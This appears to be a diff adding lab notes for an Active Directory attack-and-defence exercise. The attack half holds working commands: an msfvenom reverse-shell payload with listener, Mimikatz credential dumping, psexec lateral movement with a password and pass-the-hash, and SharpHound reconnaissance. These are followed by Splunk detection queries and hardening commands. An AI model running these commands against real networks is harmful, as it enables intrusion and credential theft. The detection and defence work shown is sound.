@@ -1,1 +1,60 @@
+# Generate reverse shell payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe > payload.exe
 
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.56.101
+set LPORT 4444
+exploit
+
+
+# Upload and execute Mimikatz through Meterpreter
+upload mimikatz.exe
+execute -f mimikatz.exe
+
+# Mimikatz commands
+privilege::debug
+sekurlsa::logonpasswords
+
+
+# Lateral movement using credentials
+psexec.py corp.local/Administrator:P@ssw0rd@192.168.56.103
+
+# Using NTLM hashes
+psexec.py corp.local/Administrator@192.168.56.103 -hashes <LM_hash>:<NTLM_hash>
+
+
+# Run SharpHound for AD information collection
+SharpHound.exe -c all
+
+# BloodHound startup
+neo4j console
+bloodhound
+
+
+# Successful logons (network/RDP)
+index=winlogs EventCode=4624 LogonType=3 OR LogonType=10
+
+# Privilege escalation
+index=winlogs EventCode=4672
+
+# Process creation (detect mimikatz, psexec)
+index=winlogs EventCode=4688 CommandLine="*mimikatz*"
+index=winlogs EventCode=4688 CommandLine="*psexec*"
+
+
+4624 – Successful logon
+4672 – Special privileges assigned
+4688 – Process creation
+
+
+# Enable LSASS Protection (RunAsPPL)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
+
+# Block SMB lateral movement
+New-NetFirewallRule -DisplayName "Block SMB" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block
+
+# Enable ASR rule to block malicious executables
+Add-MpPreference -AttackSurfaceReductionRules_Ids D4F940AB-401B-4EFC-AADC-AD5F3C50688A -AttackSurfaceReductionRules_Actions Enabled
